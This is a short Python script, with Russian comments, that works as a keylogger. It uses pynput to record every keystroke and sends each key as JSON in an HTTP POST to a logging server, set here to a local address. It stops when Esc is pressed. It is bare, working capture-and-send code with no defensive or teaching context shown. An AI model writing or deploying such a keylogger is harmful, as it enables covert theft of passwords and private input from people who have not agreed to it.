import requests
from pynput import keyboard

SERVER_URL = "http://127.0.0.1:5000/log"

def on_press(key):
    try:
        data = {"key": key.char}
    except AttributeError:
        data = {"key": str(key)}

    try:
        requests.post(SERVER_URL, json=data)
    except Exception as e:
        print("Ошибка при отправке:", e)

    # Останавливаем по Esc
    if key == keyboard.Key.esc:
        return False   # Listener завершится

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
